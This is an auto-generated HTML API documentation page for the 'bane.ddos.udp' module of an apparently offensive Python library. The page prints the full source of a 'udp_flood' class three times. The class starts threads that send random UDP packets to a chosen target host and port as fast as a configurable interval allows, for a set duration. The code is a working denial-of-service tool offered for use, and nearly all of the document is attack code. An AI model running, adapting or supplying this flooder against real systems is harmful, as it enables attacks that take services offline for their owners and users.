<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.ddos.udp</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.ddos.utils import *

class udp_flood(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        threads_daemon=True,
        interval=0.001,
        min_size=10,
        max_size=10,
        connection=True,
        duration=60,
        threads=1,
        limiting=True,
        logs=False,
    ):
        self.target = u
        self.port = p
        self.interval = interval
        self.min_size = min_size
        self.max_size = max_size
        self.connection = connection
        self.duration = duration
        self.limiting = limiting
        self.logs = logs
        self.stop = False
        self.counter = 0
        self.start = time.time()
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            tm = time.time()
            size = 0
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    if self.connection == True:
                        s.connect((self.target, self.port))
                    msg = &#34;&#34;
                    for x in range(random.randint(self.min_size, self.max_size)):
                        msg += random.choice(lis)
                    if len(msg) &gt; 1400:
                        msg = msg[
                            0:1400
                        ]  # make sure all payloads&#39; sizes are on the right range
                    s.sendto((msg.encode(&#34;utf-8&#34;)), (self.target, self.port))
                    size += len(msg)
                    self.counter += 1
                    if (self.logs == True) and (int(time.time() - tm) == 1):
                        sys.stdout.write(
                            &#34;\rPackets: {} | Bytes/s: {}   &#34;.format(self.counter, size)
                        )
                        sys.stdout.flush()
                        tm = time.time()
                        size = 0
                    if self.limiting == True:
                        time.sleep(self.interval)
                except:
                    try:
                        time.sleep(self.interval)
                    except:
                        pass
            self.kill()
        except:
            pass</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.ddos.udp.udp_flood"><code class="flex name class">
<span>class <span class="ident">udp_flood</span></span>
<span>(</span><span>u, p=80, threads_daemon=True, interval=0.001, min_size=10, max_size=10, connection=True, duration=60, threads=1, limiting=True, logs=False)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class udp_flood(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        threads_daemon=True,
        interval=0.001,
        min_size=10,
        max_size=10,
        connection=True,
        duration=60,
        threads=1,
        limiting=True,
        logs=False,
    ):
        self.target = u
        self.port = p
        self.interval = interval
        self.min_size = min_size
        self.max_size = max_size
        self.connection = connection
        self.duration = duration
        self.limiting = limiting
        self.logs = logs
        self.stop = False
        self.counter = 0
        self.start = time.time()
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            tm = time.time()
            size = 0
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    if self.connection == True:
                        s.connect((self.target, self.port))
                    msg = &#34;&#34;
                    for x in range(random.randint(self.min_size, self.max_size)):
                        msg += random.choice(lis)
                    if len(msg) &gt; 1400:
                        msg = msg[
                            0:1400
                        ]  # make sure all payloads&#39; sizes are on the right range
                    s.sendto((msg.encode(&#34;utf-8&#34;)), (self.target, self.port))
                    size += len(msg)
                    self.counter += 1
                    if (self.logs == True) and (int(time.time() - tm) == 1):
                        sys.stdout.write(
                            &#34;\rPackets: {} | Bytes/s: {}   &#34;.format(self.counter, size)
                        )
                        sys.stdout.flush()
                        tm = time.time()
                        size = 0
                    if self.limiting == True:
                        time.sleep(self.interval)
                except:
                    try:
                        time.sleep(self.interval)
                    except:
                        pass
            self.kill()
        except:
            pass</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="bane.ddos.utils.DDoS_Class" href="utils.html#bane.ddos.utils.DDoS_Class">DDoS_Class</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="bane.ddos.udp.udp_flood.attack"><code class="name flex">
<span>def <span class="ident">attack</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def attack(self):
    try:
        time.sleep(1)
        tm = time.time()
        size = 0
        while True:
            if (
                int(time.time() - self.start) &gt;= self.duration
            ):  # this is a safety mechanism so the attack won&#39;t run forever
                break
            if self.stop == True:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                if self.connection == True:
                    s.connect((self.target, self.port))
                msg = &#34;&#34;
                for x in range(random.randint(self.min_size, self.max_size)):
                    msg += random.choice(lis)
                if len(msg) &gt; 1400:
                    msg = msg[
                        0:1400
                    ]  # make sure all payloads&#39; sizes are on the right range
                s.sendto((msg.encode(&#34;utf-8&#34;)), (self.target, self.port))
                size += len(msg)
                self.counter += 1
                if (self.logs == True) and (int(time.time() - tm) == 1):
                    sys.stdout.write(
                        &#34;\rPackets: {} | Bytes/s: {}   &#34;.format(self.counter, size)
                    )
                    sys.stdout.flush()
                    tm = time.time()
                    size = 0
                if self.limiting == True:
                    time.sleep(self.interval)
            except:
                try:
                    time.sleep(self.interval)
                except:
                    pass
        self.kill()
    except:
        pass</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.ddos" href="index.md">bane.ddos</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.ddos.udp.udp_flood" href="#bane.ddos.udp.udp_flood">udp_flood</a></code></h4>
<ul class="">
<li><code><a title="bane.ddos.udp.udp_flood.attack" href="#bane.ddos.udp.udp_flood.attack">attack</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>